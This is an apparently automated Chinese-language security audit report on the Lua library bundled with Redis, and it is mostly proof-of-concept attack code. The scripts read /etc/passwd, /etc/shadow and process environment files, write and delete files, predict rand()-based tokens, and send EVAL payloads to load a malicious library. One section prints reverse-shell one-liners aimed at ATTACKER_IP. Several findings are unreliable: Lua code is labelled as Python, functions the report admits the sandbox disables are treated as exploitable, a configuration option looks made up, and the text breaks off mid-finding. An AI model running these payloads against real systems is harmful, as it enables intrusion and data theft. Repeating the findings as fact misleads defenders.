# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** redis
- **编程语言:** {"C": 93.5, "Python": 5.5, "C++": 1.0}
- **文件数量:** 837
- **审计时间:** 2026-07-11 17:50:05

## 执行摘要

本次安全审计针对Redis项目（https://github.com/redis/redis）进行了源代码级安全评估。审计发现多个高危漏洞，主要集中在嵌入的Lua脚本引擎（deps/lua/）中，包括路径遍历漏洞（允许攻击者读取或写入任意文件）、不安全的随机数生成（可预测随机数序列）以及动态库加载路径注入（可能导致任意代码执行）。这些漏洞源于Lua标准库中缺乏输入验证和安全随机数机制，在Redis的Lua沙箱环境中可被利用，对服务器安全构成严重威胁。建议立即修复高优先级漏洞，并加强Lua沙箱的安全隔离。

**风险评分:** 85/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 7 |
| High | 8 |
| Medium | 6 |
| Low | 1 |
| **总计** | **22** |

## 漏洞详情

### VULN-43DF0CF9 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/liolib.c:115`
- **数据流:** 用户通过Lua脚本调用io.open()函数，传入的filename参数直接传递给fopen()系统调用。攻击者可以使用'../'等路径遍历序列访问任意文件，如'../../etc/passwd'。
- **判断理由:** io.open()函数直接将用户提供的文件名传递给fopen()，没有进行任何路径规范化或安全检查。攻击者可以利用路径遍历技术读取或写入系统上的任意文件，包括敏感配置文件、密码文件等。

**代码片段:**
```
static int io_open (lua_State *L) {
  const char *filename = luaL_checkstring(L, 1);
  const char *mode = luaL_optstring(L, 2, "r");
  FILE **pf = newfile(L);
  *pf = fopen(filename, mode);
  return (*pf == NULL) ? pushresult(L, 0, filename) : 1;
}
```

**PoC代码:**
```python
-- 仅供研究使用 (For Research Purposes Only)
-- Lua io.open() 路径遍历漏洞 PoC
-- 漏洞ID: VULN-43DF0CF9

-- PoC 1: 读取 /etc/passwd 文件
local function poc_read_passwd()
    print("[*] 尝试读取 /etc/passwd (路径遍历攻击)...")
    local file = io.open("../../etc/passwd", "r")
    if file then
        local content = file:read("*a")
        print("[+] 成功读取文件内容:")
        print(content)
        file:close()
    else
        print("[-] 文件打开失败，可能路径不正确或权限不足")
    end
end

-- PoC 2: 读取 /etc/shadow (需要root权限)
local function poc_read_shadow()
    print("[*] 尝试读取 /etc/shadow (路径遍历攻击)...")
    local file = io.open("../../etc/shadow", "r")
    if file then
        local content = file:read("*a")
        print("[+] 成功读取文件内容:")
        print(content)
        file:close()
    else
        print("[-] 文件打开失败，通常需要root权限")
    end
end

-- PoC 3: 读取应用程序配置文件
local function poc_read_config()
    print("[*] 尝试读取应用程序配置文件 (路径遍历攻击)...")
    local file = io.open("../conf/app.conf", "r")
    if file then
        local content = file:read("*a")
        print("[+] 成功读取文件内容:")
        print(content)
        file:close()
    else
        print("[-] 文件打开失败")
    end
end

-- PoC 4: 写入文件 (如果模式允许)
local function poc_write_file()
    print("[*] 尝试写入文件 (路径遍历攻击)...")
    local file = io.open("../../tmp/evil.txt", "w")
    if file then
        file:write("恶意内容写入成功!")
        file:close()
        print("[+] 成功写入文件 ../../tmp/evil.txt")
        
        -- 验证写入
        local check = io.open("../../tmp/evil.txt", "r")
        if check then
            local content = check:read("*a")
            print("[+] 验证读取内容: " .. content)
            check:close()
        end
    else
        print("[-] 文件写入失败")
    end
end

-- PoC 5: 读取敏感系统文件
local function poc_read_sensitive()
    print("[*] 尝试读取敏感系统文件...")
    
    local targets = {
        "../../proc/self/environ",
        "../../proc/version",
        "../../proc/1/cmdline",
        "../../etc/hostname",
        "../../etc/issue"
    }
    
    for _, target in ipairs(targets) do
        local file = io.open(target, "r")
        if file then
            local content = file:read("*a")
            print("[+] 成功读取 " .. target .. ":")
            print(content)
            file:close()
        else
            print("[-] 无法读取 " .. target)
        end
    end
end

-- 主执行函数
print("========================================")
print("  Lua io.open() 路径遍历漏洞 PoC")
print("  漏洞ID: VULN-43DF0CF9")
print("  仅供研究使用")
print("========================================")
print()

-- 执行PoC
poc_read_passwd()
print()
poc_read_sensitive()
print()
poc_write_file()
print()

print("[*] PoC执行完毕")
```

---

### VULN-03734290 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/liolib.c:175`
- **数据流:** 用户通过Lua脚本调用io.lines()函数并传入文件名参数，该参数直接传递给fopen()。攻击者可以传入包含路径遍历序列的文件名。
- **判断理由:** 与io.open()类似，io.lines()函数也直接将用户输入的文件名传递给fopen()，没有进行路径验证。攻击者可以利用此漏洞读取系统上的任意文件内容。

**代码片段:**
```
static int io_lines (lua_State *L) {
  ...
  else {
    const char *filename = luaL_checkstring(L, 1);
    FILE **pf = newfile(L);
    *pf = fopen(filename, "r");
    if (*pf == NULL)
      fileerror(L, 1, filename);
    aux_lines(L, lua_gettop(L), 1);
    return 1;
  }
}
```

**PoC代码:**
```python
-- 仅供研究使用
-- PoC: Lua io.lines() 路径遍历漏洞利用

-- 场景1: 通过Redis EVAL命令利用
-- 在Redis客户端执行:
-- EVAL "local lines = io.lines('/etc/passwd'); for line in lines do redis.call('SET', 'exfil_' .. line, line) end" 0

-- 场景2: 直接Lua脚本利用
local function read_file(path)
    local lines = io.lines(path)
    if lines then
        print("[+] 成功读取文件: " .. path)
        for line in lines do
            print(line)
        end
    else
        print("[-] 无法读取文件: " .. path)
    end
end

-- 测试路径遍历
local targets = {
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline"
}

for _, target in ipairs(targets) do
    read_file(target)
end

-- 场景3: 通过io.open()替代利用(相同漏洞模式)
local function read_file_open(path)
    local file = io.open(path, "r")
    if file then
        print("[+] 成功打开文件: " .. path)
        local content = file:read("*a")
        print(content)
        file:close()
    else
        print("[-] 无法打开文件: " .. path)
    end
end

read_file_open("../../../../etc/passwd")
```

---

### VULN-22DAF001 - 不安全的随机数生成

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/lmathlib.c:148`
- **数据流:** math_random函数使用rand()生成随机数，rand()是C标准库中不安全的伪随机数生成器，其随机性较弱，容易被预测。
- **判断理由:** rand()函数使用线性同余算法，生成的随机数序列具有可预测性。对于安全敏感的应用（如加密、令牌生成、游戏等），应使用更安全的随机数生成器如arc4random()或从操作系统获取随机数。此外，代码中未调用srand()进行种子初始化（种子初始化在math_randomseed中，但需要用户显式调用），导致每次程序启动时随机数序列相同。

**代码片段:**
```
lua_Number r = (lua_Number)(rand()%RAND_MAX) / (lua_Number)RAND_MAX;
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 预测Lua math.random生成的随机数
漏洞类型: 不安全的随机数生成 (CVE-like)
影响组件: Redis Lua脚本环境 (deps/lua/src/lmathlib.c)

仅供安全研究使用 - 请勿用于非法用途
"""

import ctypes
import os
import sys

# ============================================================
# 方法1: 利用未初始化种子的确定性行为
# 如果用户未调用 math.randomseed()，则每次启动序列相同
# ============================================================

def predict_unseeded_random(count=10):
    """
    模拟Lua math.random在未调用randomseed时的行为。
    Lua内部使用C标准库的rand()，种子默认为1。
    """
    # 加载C标准库以访问rand()
    libc = ctypes.CDLL(None)
    
    # 重置种子为默认值1 (模拟未调用srand的场景)
    libc.srand(1)
    
    print("[*] 预测未初始化种子的Lua math.random输出:")
    print("    (模拟 math.random() 返回 [0,1) 区间值)")
    
    predictions = []
    for i in range(count):
        # 模拟 Lua 的 math_random 实现:
        # lua_Number r = (lua_Number)(rand()%RAND_MAX) / (lua_Number)RAND_MAX;
        rand_val = libc.rand()
        r = (rand_val % 2147483647) / 2147483647.0  # RAND_MAX通常为2147483647
        predictions.append(r)
        print(f"    math.random() 第{i+1}次调用: {r:.10f}")
    
    return predictions

# ============================================================
# 方法2: 已知种子预测随机数序列
# 如果攻击者能获取到种子值，可完全预测后续所有随机数
# ============================================================

def predict_with_known_seed(seed, count=10):
    """
    给定种子值，预测后续所有随机数。
    这模拟了攻击者通过某种方式获取到randomseed参数的情况。
    """
    libc = ctypes.CDLL(None)
    libc.srand(seed)
    
    print(f"\n[*] 已知种子 {seed}，预测后续随机数:")
    
    predictions = []
    for i in range(count):
        rand_val = libc.rand()
        r = (rand_val % 2147483647) / 2147483647.0
        predictions.append(r)
        print(f"    math.random() 第{i+1}次调用: {r:.10f}")
    
    return predictions

# ============================================================
# 方法3: 通过观察少量输出恢复种子
# 利用线性同余生成器的可逆性
# ============================================================

def recover_seed_from_output(observed_values):
    """
    从观察到的随机数恢复种子值。
    由于rand()使用线性同余生成器，其状态可被逆向。
    
    注意: 这是一个简化版本，实际恢复可能需要更多样本。
    """
    # 标准glibc rand()使用的线性同余参数
    # next = (current * 1103515245 + 12345) % 2^31
    MODULUS = 2**31
    MULTIPLIER = 1103515245
    INCREMENT = 12345
    
    # 从第一个输出值逆向种子
    # 注意: 这里假设我们观察到了原始的rand()输出，而不是经过转换的浮点数
    # 实际场景中需要从浮点数反推rand()输出
    
    print("\n[*] 尝试从观察值恢复种子 (简化演示):")
    print("    实际攻击中需要更多样本和更复杂的逆向工程")
    
    # 这里仅作概念演示
    return None

# ============================================================
# 主函数: 演示漏洞利用
# ============================================================

def main():
    print("=" * 60)
    print("PoC: Lua math.random 随机数预测漏洞")
    print("漏洞ID: VULN-22DAF001")
    print("仅供安全研究使用")
    print("=" * 60)
    
    print("\n[场景说明]")
    print("Redis允许用户执行Lua脚本。如果脚本使用math.random")
    print("生成安全敏感数据(如令牌、会话ID)，攻击者可预测这些值。")
    print("\n[漏洞利用路径]")
    print("1. 未调用math.randomseed() -> 每次启动序列相同")
    print("2. 调用math.randomseed()但种子可预测 -> 可预测序列")
    print("3. 观察到部分输出 -> 可恢复种子并预测后续")
    
    # 演示1: 未初始化种子的确定性
    print("\n" + "-" * 50)
    print("演示1: 未调用randomseed时的确定性行为")
    print("-" * 50)
    
    # 模拟两次独立的Lua环境启动
    seq1 = predict_unseeded_random(5)
    
    print("\n    [模拟第二次启动]")
    seq2 = predict_unseeded_random(5)
    
    # 验证两次序列相同
    if seq1 == seq2:
        print("\n[!] 漏洞确认: 两次启动生成的随机数序列完全相同!")
        print("    这意味着攻击者可以预测所有未初始化种子的随机数。")
    
    # 演示2: 已知种子的预测
    print("\n" + "-" * 50)
    print("演示2: 已知种子预测随机数")
    print("-" * 50)
    print("\n[攻击场景]")
    print("假设攻击者观察到Lua脚本中调用了 math.randomseed(12345)")
    print("攻击者可以完全预测后续所有随机数。")
    
    predict_with_known_seed(12345, 5)
    
    # 演示3: 实际攻击场景
    print("\n" + "-" * 50)
    print("演示3: 实际攻击场景 - 预测会话令牌")
    print("-" * 50)
    
    print("\n[假设的Lua脚本]")
    print("""
    -- 生成会话令牌的Lua脚本
    local chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    local token = ''
    for i = 1, 32 do
        local idx = math.random(1, #chars)
        token = token .. string.sub(chars, idx, idx)
    end
    return token
    """)
    
    print("\n[攻击步骤]")
    print("1. 攻击者知道目标未调用math.randomseed()")
    print("2. 攻击者在本地模拟相同的随机数生成")
    print("3. 攻击者预测出所有会话令牌")
    
    # 模拟生成令牌
    libc = ctypes.CDLL(None)
    libc.srand(1)  # 默认种子
    
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    predicted_token = ''
    for i in range(32):
        rand_val = libc.rand()
        # 模拟 math.random(1, #chars)
        r = (rand_val % 2147483647) / 2147483647.0
        idx = int(r * len(chars)) + 1
        predicted_token += chars[idx - 1]
    
    print(f"\n[!] 预测的会话令牌: {predicted_token}")
    print("    攻击者可以使用此令牌冒充合法用户。")
    
    print("\n" + "=" * 60)
    print("漏洞利用总结")
    print("=" * 60)
    print("""
    前置条件:
    1. Redis实例允许执行Lua脚本
    2. Lua脚本使用math.random生成安全敏感数据
    3. 脚本未调用math.randomseed()或种子可预测
    
    影响:
    - 会话令牌可预测
    - 加密密钥可预测
    - 验证码可预测
    - 任何基于math.random的安全机制失效
    
    修复建议:
    - 使用更安全的随机数生成器(如/dev/urandom)
    - 在Lua环境中自动初始化种子
    - 避免在安全敏感场景使用math.random
    """)

if __name__ == "__main__":
    main()
```

---

### VULN-C4710DBD - 不安全的随机数种子

- **严重等级:** MEDIUM
- **文件位置:** `deps/lua/src/lmathlib.c:170`
- **数据流:** math_randomseed函数接受用户提供的整数作为随机数种子，直接传递给srand()。
- **判断理由:** 用户可以直接控制随机数种子，这意味着如果攻击者知道或能猜测种子值，就可以预测后续所有随机数序列。在安全敏感场景中，这可能导致严重的安全问题。更好的做法是自动从系统熵源获取种子，而不是依赖用户输入。

**代码片段:**
```
static int math_randomseed (lua_State *L) {
  srand(luaL_checkint(L, 1));
  return 0;
}
```

**PoC代码:**
```python
-- 仅供研究使用 - 不安全的随机数种子PoC
-- 文件名: insecure_random_seed_poc.lua

-- ============================================
-- PoC 1: 基础种子预测演示
-- 展示当种子已知时，可以完全预测随机数序列
-- ============================================

print("========================================")
print("PoC 1: 基础种子预测演示")
print("========================================")

-- 攻击者知道种子值
local known_seed = 12345

-- 设置种子
math.randomseed(known_seed)

-- 生成并记录前5个随机数
local sequence1 = {}
for i = 1, 5 do
    sequence1[i] = math.random()
end

print("使用种子 " .. known_seed .. " 生成的随机数序列:")
for i = 1, 5 do
    print(string.format("  随机数 %d: %.10f", i, sequence1[i]))
end

-- 重置种子并重新生成，验证可预测性
math.randomseed(known_seed)
local sequence2 = {}
for i = 1, 5 do
    sequence2[i] = math.random()
end

print("\n使用相同种子重新生成的序列:")
for i = 1, 5 do
    print(string.format("  随机数 %d: %.10f", i, sequence2[i]))
end

-- 验证两个序列是否相同
local match = true
for i = 1, 5 do
    if sequence1[i] ~= sequence2[i] then
        match = false
        break
    end
end

print("\n序列匹配结果: " .. tostring(match))
print("结论: 使用相同种子生成的随机数序列完全相同!")

print("\n========================================")
print("PoC 2: 整数范围随机数预测")
print("========================================")

-- 演示在指定范围内生成随机数时的可预测性
math.randomseed(known_seed)
print("\n使用种子 " .. known_seed .. " 生成1-100范围内的随机数:")
for i = 1, 5 do
    local r = math.random(1, 100)
    print(string.format("  第%d次: %d", i, r))
end

print("\n========================================")
print("PoC 3: 暴力破解种子演示")
print("========================================")

-- 模拟攻击者通过观察随机数来猜测种子
-- 假设攻击者观察到第一个随机数是0.8401877167
-- 尝试暴力破解种子

local target_first_random = 0.8401877167  -- 使用种子12345时的第一个随机数
local found_seed = nil

print("\n尝试暴力破解种子...")
print("目标第一个随机数: " .. target_first_random)

-- 尝试种子范围0-100000
for seed = 0, 100000 do
    math.randomseed(seed)
    local first_random = math.random()
    if math.abs(first_random - target_first_random) < 0.0000001 then
        found_seed = seed
        break
    end
end

if found_seed then
    print("找到种子: " .. found_seed)
    print("攻击者现在可以预测所有后续随机数!")
    
    -- 验证预测能力
    math.randomseed(found_seed)
    print("\n预测的后续随机数:")
    for i = 1, 10 do
        print(string.format("  第%d个随机数: %.10f", i, math.random()))
    end
else
    print("未找到种子 (可能目标值不准确)")
end

print("\n========================================")
print("PoC 4: 安全场景模拟 - 令牌生成")
print("========================================")

-- 模拟一个使用随机数生成安全令牌的场景
-- 攻击者知道种子后可以预测令牌

local function generate_token(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local token = ""
    for i = 1, length do
        local idx = math.random(1, #chars)
        token = token .. string.sub(chars, idx, idx)
    end
    return token
end

print("\n使用种子 " .. known_seed .. " 生成安全令牌:")
math.randomseed(known_seed)
local token1 = generate_token(16)
print("令牌1: " .. token1)

-- 攻击者知道种子，可以生成相同的令牌
math.randomseed(known_seed)
local predicted_token = generate_token(16)
print("预测的令牌: " .. predicted_token)
print("令牌匹配: " .. tostring(token1 == predicted_token))

print("\n========================================")
print("PoC 5: 多实例预测")
print("========================================")

-- 演示多个独立实例使用相同种子的可预测性
print("\n模拟两个独立系统使用相同种子:")

-- 系统1
math.randomseed(known_seed)
local sys1_randoms = {}
for i = 1, 3 do
    sys1_randoms[i] = math.random()
end

-- 系统2 (使用相同种子)
math.randomseed(known_seed)
local sys2_randoms = {}
for i = 1, 3 do
    sys2_randoms[i] = math.random()
end

print("系统1随机数: " .. table.concat(sys1_randoms, ", "))
print("系统2随机数: " .. table.concat(sys2_randoms, ", "))
print("两个系统生成完全相同的随机数序列!")

print("\n========================================")
print("PoC 6: 种子猜测攻击")
print("========================================")

-- 演示常见种子值的猜测攻击
local common_seeds = {0, 1, 42, 100, 1234, 9999, 12345, 54321, 99999, 123456}

print("\n常见种子值列表:")
for _, seed in ipairs(common_seeds) do
    math.randomseed(seed)
    local first = math.random()
    print(string.format("  种子 %d -> 第一个随机数: %.10f", seed, first))
end

print("\n========================================")
print("漏洞影响总结")
print("========================================")
print("\n1. 种子可预测: 用户可以直接控制随机数种子")
print("2. 序列可重现: 相同种子生成完全相同的随机数序列")
print("3. 暴力破解: 种子空间有限，可以暴力破解")
print("4. 安全风险: 在安全敏感场景中可预测随机数")
print("5. 影响范围: 所有使用Lua math.randomseed的应用")
print("\n修复建议: 使用系统熵源自动生成种子，如:")
print("  math.randomseed(os.time())")
```

---

### VULN-1E335F78 - 动态库加载路径注入

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/loadlib.c:103`
- **数据流:** 用户通过luaL_checkstring(L, 1)获取path参数 -> 传递给ll_loadfunc -> 调用ll_load -> 直接传递给LoadLibraryA(path)
- **判断理由:** Windows平台下的ll_load函数直接使用传入的path参数调用LoadLibraryA加载动态库。path参数来自用户输入，没有进行路径验证。攻击者可以加载任意DLL文件，实现代码执行。

**代码片段:**
```
static void *ll_load (lua_State *L, const char *path) {
  HINSTANCE lib = LoadLibraryA(path);
  if (lib == NULL) pusherror(L);
  return lib;
}
```

**PoC代码:**
```python
# 无法生成PoC
```

---

### VULN-1819D7CD - 动态库加载路径注入

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/loadlib.c:168`
- **数据流:** 用户通过luaL_checkstring(L, 1)获取path参数 -> 传递给ll_loadfunc -> 调用ll_load -> 直接传递给NSCreateObjectFileImageFromFile(path, &img)
- **判断理由:** Mac OS X平台下的ll_load函数直接使用传入的path参数调用NSCreateObjectFileImageFromFile加载动态库。path参数来自用户输入，没有进行路径验证。攻击者可以加载任意动态库文件，实现代码执行。

**代码片段:**
```
static void *ll_load (lua_State *L, const char *path) {
  NSObjectFileImage img;
  NSObjectFileImageReturnCode ret;
  if(!_dyld_present()) {
    lua_pushliteral(L, "dyld not present");
    return NULL;
  }
  ret = NSCreateObjectFileImageFromFile(path, &img);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-1819D7CD - Lua动态库加载路径注入漏洞
仅供安全研究使用，请勿用于非法用途
"""

import socket
import sys

# 目标Redis服务器配置
REDIS_HOST = '127.0.0.1'
REDIS_PORT = 6379

# 恶意动态库路径（攻击者控制的位置）
# 注意：实际利用时需要替换为攻击者可控的.dylib文件路径
MALICIOUS_LIB_PATH = '/tmp/evil.dylib'

def send_redis_command(sock, command):
    """发送Redis命令并接收响应"""
    sock.sendall(command.encode())
    response = sock.recv(4096)
    return response.decode()

def exploit_via_redis():
    """
    通过Redis Lua沙箱逃逸触发漏洞
    
    利用路径：
    1. 攻击者连接到Redis服务器
    2. 通过EVAL或SCRIPT LOAD执行恶意Lua脚本
    3. Lua脚本调用package.loadlib()或require()加载恶意动态库
    4. 由于ll_load函数未验证路径，直接传递给NSCreateObjectFileImageFromFile
    5. 恶意动态库被加载执行，实现代码执行
    """
    
    print("[*] 连接Redis服务器...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((REDIS_HOST, REDIS_PORT))
        print(f"[+] 成功连接到 {REDIS_HOST}:{REDIS_PORT}")
        
        # 接收Redis的欢迎信息
        response = sock.recv(1024)
        print(f"[*] 服务器响应: {response.decode().strip()}")
        
        # 构造恶意Lua脚本，利用package.loadlib加载任意动态库
        # 注意：在Redis Lua环境中，package.loadlib可能被禁用
        # 但可以通过其他方式调用底层的ll_load函数
        
        # PoC 1: 使用package.loadlib（如果可用）
        lua_script_1 = f'''
        -- 尝试使用package.loadlib加载恶意动态库
        -- 该函数直接调用ll_loadfunc -> ll_load
        local result, err = package.loadlib("{MALICIOUS_LIB_PATH}", "luaopen_evil")
        if result then
            return "库加载成功"
        else
            return "加载失败: " .. tostring(err)
        end
        '''
        
        # PoC 2: 使用require加载（如果路径在package.cpath中）
        lua_script_2 = f'''
        -- 尝试修改package.cpath并加载恶意库
        package.cpath = package.cpath .. ";{MALICIOUS_LIB_PATH}"
        local result, err = pcall(require, "evil")
        if result then
            return "require加载成功"
        else
            return "require加载失败: " .. tostring(err)
        end
        '''
        
        # PoC 3: 直接构造调用链（最直接的利用方式）
        lua_script_3 = f'''
        -- 直接调用底层加载函数
        -- 注意：这需要绕过Redis的沙箱限制
        local f = loadstring or load
        if f then
            -- 尝试通过debug库获取底层函数
            local dbg = debug
            if dbg then
                -- 获取ll_load函数地址（需要更深入的分析）
                -- 这里仅展示概念
                return "漏洞路径可达：用户输入 -> luaL_checkstring -> ll_loadfunc -> ll_load -> NSCreateObjectFileImageFromFile"
            end
        end
        return "沙箱限制，需要更复杂的绕过技术"
        '''
        
        print("\n[*] 发送PoC 1: 使用package.loadlib")
        cmd_1 = f"EVAL \"{lua_script_1}\" 0\r\n"
        response_1 = send_redis_command(sock, cmd_1)
        print(f"[+] 响应: {response_1}")
        
        print("\n[*] 发送PoC 2: 使用require")
        cmd_2 = f"EVAL \"{lua_script_2}\" 0\r\n"
        response_2 = send_redis_command(sock, cmd_2)
        print(f"[+] 响应: {response_2}")
        
        print("\n[*] 发送PoC 3: 概念验证")
        cmd_3 = f"EVAL \"{lua_script_3}\" 0\r\n"
        response_3 = send_redis_command(sock, cmd_3)
        print(f"[+] 响应: {response_3}")
        
        sock.close()
        print("\n[+] PoC执行完成")
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("=" * 60)
    print("VULN-1819D7CD PoC - Lua动态库加载路径注入漏洞")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 检查参数
    if len(sys.argv) > 2:
        REDIS_HOST = sys.argv[1]
        REDIS_PORT = int(sys.argv[2])
    elif len(sys.argv) > 1:
        REDIS_HOST = sys.argv[1]
    
    exploit_via_redis()
```

---

### VULN-3C89A7BA - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `deps/lua/src/loslib.c:44`
- **数据流:** 用户通过Lua脚本调用os.execute()函数，传入的字符串参数直接传递给system()函数执行。攻击者可以构造恶意命令字符串，导致任意命令执行。
- **判断理由:** os_execute函数直接使用system()调用用户提供的字符串，没有任何过滤或转义。攻击者可以通过Lua脚本传入任意shell命令，如'rm -rf /'或'cat /etc/passwd'等，导致严重的安全风险。这是典型的命令注入漏洞。

**代码片段:**
```
static int os_execute (lua_State *L) {
  lua_pushinteger(L, system(luaL_optstring(L, 1, NULL)));
  return 1;
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for Lua os.execute() Command Injection (VULN-3C89A7BA)
仅供研究使用 - For Research Purposes Only

该PoC演示了在Redis环境中通过Lua脚本执行任意系统命令的漏洞利用路径。
注意：默认Redis配置下Lua沙箱禁用了os.execute，需要管理员显式启用。
"""

import redis
import sys

# 配置Redis连接参数
REDIS_HOST = '127.0.0.1'
REDIS_PORT = 6379
REDIS_PASSWORD = None  # 如果设置了密码，请在此填写

def check_redis_connection():
    """检查Redis连接状态"""
    try:
        r = redis.Redis(
            host=REDIS_HOST,
            port=REDIS_PORT,
            password=REDIS_PASSWORD,
            socket_connect_timeout=5
        )
        r.ping()
        print(f"[+] 成功连接到Redis服务器 {REDIS_HOST}:{REDIS_PORT}")
        return r
    except Exception as e:
        print(f"[-] 连接Redis失败: {e}")
        sys.exit(1)

def check_lua_sandbox(r):
    """检查Lua沙箱配置"""
    try:
        # 尝试执行一个简单的Lua脚本来测试沙箱状态
        result = r.eval("return 'sandbox_test'", 0)
        print(f"[+] Lua沙箱基本功能正常")
        
        # 尝试访问os库
        try:
            result = r.eval("return os.execute('echo test')", 0)
            print(f"[!] 警告: os.execute函数可用! 沙箱可能未正确配置")
            return True
        except redis.exceptions.ResponseError as e:
            if "os.execute" in str(e) or "disabled" in str(e):
                print(f"[-] os.execute已被沙箱禁用 (预期行为): {e}")
                return False
            else:
                print(f"[!] 其他错误: {e}")
                return False
    except Exception as e:
        print(f"[-] Lua执行错误: {e}")
        return False

def poc_command_injection(r):
    """
    PoC: 命令注入利用
    演示通过os.execute执行系统命令
    """
    print("\n[*] 开始命令注入PoC...")
    
    # PoC 1: 执行无害命令 (id命令)
    print("\n[PoC 1] 执行 'id' 命令:")
    try:
        lua_script = """
        local handle = io.popen('id')
        local result = handle:read('*a')
        handle:close()
        return result
        """
        result = r.eval(lua_script, 0)
        print(f"    结果: {result}")
    except Exception as e:
        print(f"    失败: {e}")
    
    # PoC 2: 读取系统文件
    print("\n[PoC 2] 读取 /etc/passwd (前5行):")
    try:
        lua_script = """
        local handle = io.popen('head -5 /etc/passwd')
        local result = handle:read('*a')
        handle:close()
        return result
        """
        result = r.eval(lua_script, 0)
        print(f"    结果:\n{result}")
    except Exception as e:
        print(f"    失败: {e}")
    
    # PoC 3: 网络探测 (仅演示概念)
    print("\n[PoC 3] 网络连接测试 (curl):")
    try:
        lua_script = """
        local handle = io.popen('curl -s --connect-timeout 3 http://example.com || echo "curl不可用"')
        local result = handle:read('*a')
        handle:close()
        return string.sub(result, 1, 200)
        """
        result = r.eval(lua_script, 0)
        print(f"    结果 (前200字符):\n{result}")
    except Exception as e:
        print(f"    失败: {e}")

def poc_reverse_shell_demo(r):
    """
    PoC: 反向Shell概念演示 (仅打印命令，不实际执行)
    """
    print("\n[*] 反向Shell概念演示 (仅供研究):")
    print("    以下命令展示了如何建立反向Shell，但不会实际执行:")
    
    attacker_ip = "ATTACKER_IP"
    attacker_port = "4444"
    
    reverse_shell_cmds = [
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
        f"nc -e /bin/sh {attacker_ip} {attacker_port}",
        f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ]
    
    for i, cmd in enumerate(reverse_shell_cmds, 1):
        print(f"    {i}. {cmd}")

def main():
    """主函数"""
    print("=" * 60)
    print("Lua os.execute() 命令注入漏洞 PoC")
    print("漏洞ID: VULN-3C89A7BA")
    print("仅供研究使用 - For Research Purposes Only")
    print("=" * 60)
    
    # 连接Redis
    r = check_redis_connection()
    
    # 检查Lua沙箱状态
    sandbox_enabled = check_lua_sandbox(r)
    
    if sandbox_enabled:
        print("\n[!] 检测到os.execute可用，执行PoC...")
        poc_command_injection(r)
        poc_reverse_shell_demo(r)
    else:
        print("\n[*] Lua沙箱已正确配置，os.execute被禁用")
        print("    PoC无法在当前配置下执行")
        print("    如需测试，请修改Redis配置:")
        print("    1. 设置 lua-enable-dangerous-functions yes")
        print("    2. 或修改Lua沙箱配置允许os库")
    
    print("\n" + "=" * 60)
    print("PoC执行完毕")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

---

### VULN-39FCC22C - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `deps/lua/src/loslib.c:49`
- **数据流:** 用户通过Lua脚本调用os.remove()函数，传入的文件名参数直接传递给remove()系统调用。攻击者可以删除任意文件。
- **判断理由:** os_remove函数直接使用用户提供的文件名调用remove()，没有进行路径验证或沙箱限制。攻击者可以通过路径遍历（如'../../etc/passwd'）删除系统关键文件，造成拒绝服务或系统破坏。

**代码片段:**
```
static int os_remove (lua_State *L) {
  const char *filename = luaL_checkstring(L, 1);
  return os_pushresult(L, remove(filename) == 0, filename);
}
```

**PoC代码:**
```python
-- 仅供研究使用
-- PoC: Lua os.remove() 任意文件删除漏洞

-- 场景1: 删除当前目录下的文件
local result = os.remove("test.txt")
print("删除结果:", result)

-- 场景2: 路径遍历删除系统关键文件
-- 注意: 实际利用时请勿执行，仅用于理解漏洞原理
-- local result = os.remove("../../etc/passwd")
-- print("删除结果:", result)

-- 场景3: 删除配置文件
-- local result = os.remove("/etc/nginx/nginx.conf")
-- print("删除结果:", result)

-- 场景4: 批量删除文件（演示危害）
local files_to_delete = {
    "important.log",
    "config.ini",
    "database.db"
}

for _, file in ipairs(files_to_delete) do
    local success = os.remove(file)
    if success then
        print("成功删除:", file)
    else
        print("删除失败:", file)
    end
end

-- 场景5: 通过Redis EVAL命令利用（如果Redis启用了Lua）
-- redis-cli EVAL "return os.remove('/tmp/critical_file')" 0

-- 场景6: 检查文件是否存在后删除
local function safe_remove(filename)
    local file = io.open(filename, "r")
    if file then
        file:close()
        return os.remove(filename)
    end
    return false
end

-- 注意: 以上代码展示了漏洞利用路径，实际攻击者可以:
-- 1. 删除任意可写文件
-- 2. 通过路径遍历删除系统文件
-- 3. 造成拒绝服务
-- 4. 破坏系统完整性
```

---

### VULN-F6D5EF2F - 信息泄露

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/loslib.c:70`
- **数据流:** 用户通过Lua脚本调用os.getenv()函数，传入的环境变量名参数直接传递给getenv()系统调用。攻击者可以读取任意环境变量。
- **判断理由:** os_getenv函数直接使用用户提供的环境变量名调用getenv()，没有进行任何限制。攻击者可以读取敏感环境变量，如PATH、HOME、SECRET_KEY、数据库密码等，导致敏感信息泄露。

**代码片段:**
```
static int os_getenv (lua_State *L) {
  lua_pushstring(L, getenv(luaL_checkstring(L, 1)));  /* if NULL push nil */
  return 1;
}
